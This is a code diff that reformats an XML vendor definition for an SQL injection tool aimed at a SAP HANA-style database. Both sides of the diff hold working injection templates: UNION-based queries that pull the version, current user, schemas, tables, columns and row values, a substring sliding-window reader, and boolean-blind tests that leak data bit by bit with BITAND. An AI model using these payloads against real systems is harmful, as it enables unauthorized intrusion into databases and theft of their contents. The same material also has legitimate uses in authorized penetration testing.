@@ -5,41 +5,46 @@
         <info>
 select
     '${ENCLOSE_VALUE_SQL}'
-    ||version
-    ||'${ENCLOSE_VALUE_SQL}'
-    ||database_name
-    ||'${ENCLOSE_VALUE_SQL}'
-    ||CURRENT_USER
-    ||'${TRAIL_SQL}'
+    || version
+    || '${ENCLOSE_VALUE_SQL}'
+    || database_name
+    || '${ENCLOSE_VALUE_SQL}'
+    || CURRENT_USER
+    || '${TRAIL_SQL}'
 from sys.m_database
         </info>
         <schema>
             <database>
-select STRING_AGG(
-    '${ENCLOSE_VALUE_SQL}'
-    ||r
-    ||'${SEPARATOR_QTE_SQL}'
-    ||'0'
-    ||'${ENCLOSE_VALUE_SQL}',
-    '${SEPARATOR_CELL_SQL}'
-    ORDER BY r
-)||'${TRAIL_SQL}'
+select 
+    STRING_AGG(
+        '${ENCLOSE_VALUE_SQL}'
+        || r
+        || '${SEPARATOR_QTE_SQL}'
+        || '0'
+        || '${ENCLOSE_VALUE_SQL}',
+        '${SEPARATOR_CELL_SQL}'
+        ORDER BY r
+    )
+    || '${TRAIL_SQL}'
 from (
-    select schema_name r from sys.schemas
+    select schema_name r
+    from sys.schemas
     order by r
     {limit}
 )
             </database>
             <table>
-select STRING_AGG(
-    '${ENCLOSE_VALUE_SQL}'
-    ||r
-    ||'${SEPARATOR_QTE_SQL}'
-    ||'0'
-    ||'${ENCLOSE_VALUE_SQL}',
-    '${SEPARATOR_CELL_SQL}'
-    ORDER BY r
-)||'${TRAIL_SQL}'
+select 
+    STRING_AGG(
+        '${ENCLOSE_VALUE_SQL}'
+        || r
+        || '${SEPARATOR_QTE_SQL}'
+        || '0'
+        || '${ENCLOSE_VALUE_SQL}',
+        '${SEPARATOR_CELL_SQL}'
+        ORDER BY r
+    )
+    || '${TRAIL_SQL}'
 from (
     select distinct name r
     from sys.rs_tables_ t
@@ -53,40 +58,44 @@ from (
 )
             </table>
             <column>
-select STRING_AGG(
-    '${ENCLOSE_VALUE_SQL}'
-    ||r
-    ||'${SEPARATOR_QTE_SQL}'
-    ||'0'
-    ||'${ENCLOSE_VALUE_SQL}',
-    '${SEPARATOR_CELL_SQL}'
-    ORDER BY r
-)||'${TRAIL_SQL}'
+select 
+    STRING_AGG(
+        '${ENCLOSE_VALUE_SQL}'
+        || r
+        || '${SEPARATOR_QTE_SQL}'
+        || '0'
+        || '${ENCLOSE_VALUE_SQL}',
+        '${SEPARATOR_CELL_SQL}'
+        ORDER BY r
+    )
+    || '${TRAIL_SQL}'
 from (
     select distinct c.name r
     from sys.rs_columns_ c
     inner join sys.rs_tables_ t on c.cid = t.oid
-    where t.schema = '${DATABASE}' and t.name='${TABLE}'
+    where t.schema = '${DATABASE}' and t.name = '${TABLE}'
     union
     select distinct c1.name r
     from sys.rs_columns_ c1
     inner join sys.rs_views_ v on c1.cid = v.oid
-    where v.schema = '${DATABASE}' and v.name='${TABLE}'
+    where v.schema = '${DATABASE}' and v.name = '${TABLE}'
     order by r
     {limit}
 )
             </column>
             <row>
                 <query>
-select STRING_AGG(
-    '${ENCLOSE_VALUE_SQL}'
-    ||r
-    ||'${SEPARATOR_QTE_SQL}'
-    ||'0'
-    ||'${ENCLOSE_VALUE_SQL}',
-    '${SEPARATOR_CELL_SQL}'
-    ORDER BY r
-)||'${TRAIL_SQL}'
+select 
+    STRING_AGG(
+        '${ENCLOSE_VALUE_SQL}'
+        || r
+        || '${SEPARATOR_QTE_SQL}'
+        || '0'
+        || '${ENCLOSE_VALUE_SQL}',
+        '${SEPARATOR_CELL_SQL}'
+        ORDER BY r
+    )
+    || '${TRAIL_SQL}'
 from (
     select distinct (${FIELDS})r
     from ${DATABASE}.${TABLE}
@@ -95,8 +104,8 @@ from (
 )
                 </query>
                 <fields>
-                <field>trim(coalesce(${FIELD},''))</field>
-                <concat>||'%7f'||</concat>
+                <field>trim(coalesce(${FIELD}, ''))</field>
+                <concat>|| '%7f' ||</concat>
                 </fields>
             </row>
         </schema>
@@ -108,46 +117,65 @@ select
     /**
      * If reach end of string (${LEAD}i) then NULLIF nullifies the result
      */
-    '${LEAD}'||NULLIF(substr(
-        (${INJECTION}),
-        ${INDEX},
-        65536
-    ),'${TRAIL_SQL}')
+    '${LEAD}'
+    || NULLIF (
+        substr (
+            (${INJECTION}),
+            ${INDEX},
+            65536
+        ),
+        '${TRAIL_SQL}'
+    )
 from dummy
             </slidingWindow>
             <limit>limit 65536 offset ${LIMIT}</limit>
             <failsafe>(1337${INDICE}7330%2b1)</failsafe>
-            <calibrator>rpad('${CALIBRATOR_SQL}',1024,'${CALIBRATOR_SQL}')</calibrator>
+            <calibrator>
+rpad(
+    '${CALIBRATOR_SQL}', 
+    1024, 
+    '${CALIBRATOR_SQL}'
+)
+            </calibrator>
             <limitBoundary>0</limitBoundary>
         </configuration>
         <normal>
             <indices>union select ${INDICES} from dummy</indices>
-            <capacity>('${LEAD}'||${INDICE}||${CALIBRATOR})</capacity>
+            <capacity>('${LEAD}'|| ${INDICE}|| ${CALIBRATOR})</capacity>
             <orderBy>order by 1337</orderBy>
         </normal>
         <boolean>
             <test>
-                <false>true=false</false>
-                <false>true%21=true</false>
-                <false>false%21=false</false>
-                <false>1=2</false>
-                <false>1%21=1</false>
-                <false>2%21=2</false>
-                <true>true=true</true>
-                <true>false=false</true>
-                <true>true%21=false</true>
-                <true>1=1</true>
-                <true>2=2</true>
-                <true>1%21=2</true>
-                <initialization>0%2b1=1</initialization>
+                <false>true = false</false>
+                <false>true %21= true</false>
+                <false>false %21= false</false>
+                <false>1 = 2</false>
+                <false>1 %21= 1</false>
+                <false>2 %21= 2</false>
+                <true>true = true</true>
+                <true>false = false</true>
+                <true>true %21= false</true>
+                <true>1 = 1</true>
+                <true>2 = 2</true>
+                <true>1 %21= 2</true>
+                <initialization>0%2b1 = 1</initialization>
                 <bit><![CDATA[
 /**
  * true bit return bit, false bit return 0
  * 8 & 8 = 8, 8 & 4 = 0
  */
-0!=BITAND(ascii(substr((${INJECTION}),${INDEX},1)),${BIT})
+0 != BITAND(
+    ascii(
+        substr(
+            (${INJECTION}),
+            ${INDEX},
+            1
+        )
+    ),
+    ${BIT}
+)
                 ]]></bit>
-                <length>length((${INJECTION}))>${INDEX}</length>
+                <length>length((${INJECTION})) > ${INDEX}</length>
             </test>
             <blind>and ${TEST}</blind>
         </boolean>
